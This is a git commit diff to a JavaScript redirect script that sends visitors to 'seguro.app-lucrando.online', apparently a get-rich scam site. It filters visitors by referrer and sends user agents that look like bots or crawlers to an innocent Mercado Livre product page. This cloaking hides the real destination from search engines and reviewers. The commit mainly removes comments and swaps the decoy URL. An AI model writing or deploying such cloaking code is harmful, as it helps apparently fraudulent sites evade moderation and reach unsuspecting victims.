978102f6c824534db3e06aee1e9722e36359e323
caroldvX <166155597+caroldvX@users.noreply.github.com>
2024-09-07 14:14:19 -0300

    Update script.js

--- rdirect/script.js
+++ rdirect/script.js
@@ -2,47 +2,29 @@ window.onload = function() {
     var numeroTelefone = "safe";
     var mensagem = "Olá!";
     var link = "https://seguro.app-lucrando.online/" + numeroTelefone;
-    
     setTimeout(function() {
       window.location.href = link;
     }, 999);
   }
   var referer = document.referrer;
-
-  // Domínio permitido
   var dominioPermitido = 'https://seguro.app-lucrando.online/';
-  
-  // Verifica se o referer corresponde ao domínio permitido
   if (referer && referer.indexOf(dominioPermitido) === -1) {
-    // Redireciona para o domínio permitido
     window.location.href = 'https://' + dominioPermitido;
   } else {
-    // Domínio permitido, mostra o conteúdo da página
-    document.body.style.display = 'block'; // Mostra o corpo da página (se estiver oculto)
+    document.body.style.display = 'block';
   }
-  // Verifica o agente do usuário
 var userAgent = navigator.userAgent.toLowerCase();
-
-// Define uma variável para indicar se é um bot
 var isBot = false;
-
-// Palavras-chave que podem indicar um bot
 var botKeywords = ['bot', 'crawler', 'spider', 'http'];
-
-// Verifica se o agente do usuário contém alguma das palavras-chave
 for (var i = 0; i < botKeywords.length; i++) {
   if (userAgent.includes(botKeywords[i])) {
     isBot = true;
     break;
   }
 }
-
-// Se for detectado como um bot, redireciona ou executa ação apropriada
 if (isBot) {
-  // Aqui você pode redirecionar para outra página ou realizar outra ação
-  window.location.href = 'https://play.google.com/store/apps/details?id=com.potradeweb&hl=pt';
+  window.location.href = 'https://www.mercadolivre.com.br/livro-com-cenario-os-trs-porquinhos-com-4-personagens/p/MLB19334263?pdp_filters=item_id:MLB3597015303#wid=MLB3597015303&sid=search&is_advertising=true&searchVariation=MLB19334263&position=1&search_layout=grid&type=pad&tracking_id=ef02d443-09af-492c-80ef-9a415ceea8c0&is_advertising=true&ad_domain=VQCATCORE_LST&ad_position=1&ad_click_id=YTdmZDI1ODgtZGNlOS00YjgwLTk5ODktNWE2ZDhhYjgwZGJj';
 } else {
-  // Aqui está o código normal da sua página
-  document.body.style.display = 'block'; // Mostra o conteúdo da página (se estiver oculto)
+  document.body.style.display = 'block'; 
 }
 
